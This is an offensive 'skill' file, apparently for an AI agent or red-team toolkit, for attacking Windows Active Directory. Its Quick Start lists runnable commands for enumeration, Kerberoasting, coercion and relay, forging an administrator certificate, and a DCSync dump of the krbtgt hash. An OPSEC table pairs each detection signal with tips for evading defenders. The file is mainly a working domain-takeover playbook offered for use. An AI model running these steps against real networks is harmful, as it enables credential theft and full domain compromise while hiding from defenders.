---
name: active-directory-attack
description: Active Directory exploitation — Kerberos roasting/delegation, coercion+NTLM/Kerberos relay (CVE-2025-33073, CVE-2026-20929), ADCS ESC1-16 (EKUwu CVE-2024-49019), ticket forgery & DCSync, dMSA BadSuccessor (CVE-2025-53779), BloodHound CE attack-path enumeration and domain dominance
metadata:
  type: offensive
  phase: exploitation
  tools: impacket, certipy, rubeus, bloodhound-ce, netexec, krbrelayx, ntlmrelayx, bloodyAD, mimikatz, kerbrute, SharpSuccessor
  mitre: TA0008
kill_chain:
  phase: [exploit, actions]
  step: [4, 7]
  attck_tactics: [TA0006, TA0008, TA0004, TA0003]
  attck_techniques: [T1558, T1558.003, T1558.004, T1558.001, T1187, T1557, T1557.001, T1003.006, T1550.002, T1550.003, T1484.001, T1098, T1207]
depends_on: [network-attack, privesc-windows]
feeds_into: [red-team-ops, advanced-redteam]
inputs: [domain_info, user_context, foothold_creds]
outputs: [domain_admin_access, finding_record, credential_dump, forged_tickets]
references:
  - references/bloodhound-enum-lateral.md
  - references/kerberos-roasting-delegation.md
  - references/coercion-relay.md
  - references/adcs-abuse.md
  - references/ticket-forgery-dcsync.md
  - references/dmsa-badsuccessor.md
scripts:
  - scripts/ad_recon.py
  - scripts/kerberoast_audit.py
  - scripts/rbcd_takeover.py
  - scripts/coerce_relay_chain.sh
  - scripts/Get-BadSuccessorOUPermissions.ps1
  - scripts/adcs_esc_finder.py
---

# Active Directory Attacks

## When to Activate

- Attacking Windows domain environments after gaining any domain foothold (creds, hash, or unauth network position)
- Kerberos exploitation: Kerberoasting, AS-REP roasting, delegation (RBCD/constrained/unconstrained), ticket forgery
- Coercion + NTLM/Kerberos relay chains (PetitPotam/DFSCoerce → LDAP/ADCS, NTLM reflection CVE-2025-33073)
- ADCS certificate-template abuse (ESC1-ESC16) and certificate-based domain takeover
- dMSA / BadSuccessor privilege escalation on Windows Server 2025 domains
- BloodHound CE attack-path discovery, lateral movement, DCSync, and domain-dominance persistence

## Technique Map

| Technique | ATT&CK | CWE | Reference | Script |
|-----------|--------|-----|-----------|--------|
| BloodHound CE / SharpHound enumeration | T1482 | CWE-732 | references/bloodhound-enum-lateral.md | scripts/ad_recon.py |
| Password spray / PtH / PtT lateral movement | T1550.002, T1550.003 | CWE-522 | references/bloodhound-enum-lateral.md | scripts/ad_recon.py |
| LAPS / gMSA password read | T1003 | CWE-522 | references/bloodhound-enum-lateral.md | scripts/ad_recon.py |
| Kerberoasting | T1558.003 | CWE-261 | references/kerberos-roasting-delegation.md | scripts/kerberoast_audit.py |
| AS-REP roasting | T1558.004 | CWE-308 | references/kerberos-roasting-delegation.md | scripts/kerberoast_audit.py |
| Resource-Based Constrained Delegation (RBCD) | T1558, T1098 | CWE-269 | references/kerberos-roasting-delegation.md | scripts/rbcd_takeover.py |
| Constrained/Unconstrained delegation (S4U) | T1558 | CWE-269 | references/kerberos-roasting-delegation.md | scripts/rbcd_takeover.py |
| Coercion (PetitPotam/DFSCoerce/PrinterBug/WebDAV) | T1187 | CWE-294 | references/coercion-relay.md | scripts/coerce_relay_chain.sh |
| NTLM relay (SMB/LDAP/ADCS) | T1557.001 | CWE-294 | references/coercion-relay.md | scripts/coerce_relay_chain.sh |
| NTLM reflection (CVE-2025-33073) | T1187, T1557.001 | CWE-294 | references/coercion-relay.md | scripts/coerce_relay_chain.sh |
| Kerberos relay / DNS CNAME (CVE-2026-20929) | T1557 | CWE-294 | references/coercion-relay.md | scripts/coerce_relay_chain.sh |
| ADCS ESC1 (SAN) / ESC15 EKUwu (CVE-2024-49019) | T1649 | CWE-295 | references/adcs-abuse.md | scripts/adcs_esc_finder.py |
| ADCS ESC8 relay / ESC16 CA-wide override | T1649, T1557.001 | CWE-295 | references/adcs-abuse.md | scripts/adcs_esc_finder.py |
| Golden / Silver / Diamond / Sapphire ticket | T1558.001, T1558.002 | CWE-345 | references/ticket-forgery-dcsync.md | - |
| DCSync (DRSUAPI replication) | T1003.006 | CWE-269 | references/ticket-forgery-dcsync.md | - |
| noPac / sAMAccountName spoofing (CVE-2021-42278/87) | T1558 | CWE-287 | references/ticket-forgery-dcsync.md | - |
| dMSA BadSuccessor (CVE-2025-53779) | T1098, T1558 | CWE-269 | references/dmsa-badsuccessor.md | scripts/Get-BadSuccessorOUPermissions.ps1 |

## Quick Start

```bash
# 0. Sync clock to DC (Kerberos needs +/-5 min)
sudo ntpdate <DC_IP>   # or: faketime "$(net time -S <DC>)" <cmd>

# 1. Enumerate: BloodHound CE collection (Linux) + own the graph
bloodhound-python -u user -p 'Pass' -d corp.local -dc dc01.corp.local -ns <DC_IP> -c all --zip
#   (use the bloodhound-ce branch; legacy collectors break CE ingest)
nxc ldap <DC_IP> -u user -p 'Pass' --bloodhound --collection All --dns-server <DC_IP>

# 2. Cheap wins on the graph: roast everything visible
python3 scripts/kerberoast_audit.py -d corp.local --dc-ip <DC_IP> -u user -p 'Pass' --asrep --kerberoast

# 3. Coerce + relay to LDAP/ADCS (RBCD or cert) if signing/EPA weak
bash scripts/coerce_relay_chain.sh corp.local user 'Pass' <DC_IP> <RELAY_IP> ldap

# 4. ADCS path: find ESC1-16 and grab a DA cert
python3 scripts/adcs_esc_finder.py -d corp.local -u user -p 'Pass' --dc-ip <DC_IP>
certipy req -u user@corp.local -p 'Pass' -ca CA -template Vuln -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>          # -> NT hash / TGT

# 5. Windows Server 2025 present? Check BadSuccessor exposure
powershell -ep bypass -File scripts/Get-BadSuccessorOUPermissions.ps1

# 6. Domain dominance: DCSync krbtgt -> Golden ticket / persistence
impacket-secretsdump -just-dc-user 'corp\krbtgt' corp.local/da:'Pass'@<DC_IP>
```

## OPSEC & Detection (summary)

| Technique | Telemetry / IOC | Detection (Sigma / EDR) | OPSEC note |
|-----------|-----------------|--------------------------|------------|
| SharpHound/LDAP enum | Hundreds of LDAP queries from one host; 4662 directory access | SIEM rule: single source > N LDAP queries/minute; ADWS 9389 spikes | Throttle `--throttle/--jitter`; prefer ADWS (SOAPHound) to dodge LDAP heuristics |
| Kerberoasting | 4769 TGS-REQ with RC4 (0x17) for many SPNs from one host | Sigma `win_security_susp_kerberos_manipulation`; alert on RC4 TGS bursts | Request AES-only SPNs sparingly; `/rc4opsec`; roast few accounts, slow |
| AS-REP roasting | 4768 AS-REQ no-preauth; etype 23 | Alert on AS-REQ for DONT_REQ_PREAUTH accounts | Only target accounts BloodHound flags; offline crack |
| Coercion | EFSRPC/DFSNM/RPRN named-pipe calls; auth from server to odd host | Sigma `coercion`/`PetitPotam`; RPC firewall (RpcFilter) logs | Coercion is "by design"; NTLM removal on 2025/24H2 forces Kerberos fallback |
| NTLM relay / reflection | 4624/4648 NTLM logon to self; SMB→LDAP from non-server | Detect SMB-signing:False targets; CVE-2025-33073 DNS marshalled record | Needs signing:False target; patch (Jun 2025) detects marshalled DNS struct |
| ADCS ESC | 4886/4887 cert issuance; cert with arbitrary SAN/UPN; client-auth EKU on web template | Sigma ADCS issuance anomalies; certutil monitoring; ESC15 EKU injection | Restore templates (ESC4); EPA on certsrv breaks ESC8 relay |
| Ticket forgery | TGT lifetime anomalies; PAC w/o validation; 4769 for krbtgt SPN | Golden: ticket lifetime > policy; Sapphire mimics real PAC (hard) | Match domain ticket policy lifetimes; use AES keys not RC4 |
| DCSync | 4662 DRSUAPI GetNCChanges from non-DC | Sigma `dcsync`; alert DRSUAPI replication from non-DC IP | Run from a host that looks like a DC; avoid `/all`, target krbtgt only |
| dMSA BadSuccessor | 5137 dMSA create; 5136 write to msDS-ManagedAccountPrecededByLink | Sigma SharpSuccessor exec; SACL on dMSA attrs (off by default!) | Patched (Aug 2025) needs both sides controlled; still a creds-dump primitive |

## Deep Dives

- **references/bloodhound-enum-lateral.md** — BloodHound CE v8 / OpenGraph, SharpHound CE & bloodhound-ce collectors, NetExec, high-value Cypher, password spray, PtH/PtT/OverPtH, LAPS v1/v2 + gMSA reads, AdminSDHolder/DSRM/Skeleton-Key persistence.
- **references/kerberos-roasting-delegation.md** — Kerberoasting (incl. targeted/GenericWrite), AS-REP roasting, RBCD, constrained/unconstrained delegation, S4U2self/S4U2proxy abuse, tgt::deleg, hashcat modes.
- **references/coercion-relay.md** — All five coercion methods + WebDAV/efsr_spray, NTLM relay to SMB/LDAP/ADCS, NTLM reflection (CVE-2025-33073), Kerberos relay & DNS CNAME (CVE-2026-20929), shadow-credential relay.
- **references/adcs-abuse.md** — ESC1-ESC16 catalog with Certipy v5, EKUwu/ESC15 (CVE-2024-49019), ESC16 CA-wide override, ESC8 relay, ESC9/ESC10 mapping bypass, certificate persistence.
- **references/ticket-forgery-dcsync.md** — Golden/Silver/Diamond/Sapphire tickets, DCSync, noPac (CVE-2021-42278/87), PAC validation enforcement (CVE-2024-26248/29056), trust/SID-history & cross-forest.
- **references/dmsa-badsuccessor.md** — dMSA migration internals, BadSuccessor (CVE-2025-53779), pre/post-patch behavior, SharpSuccessor / bloodyAD / NetExec tooling, detection.
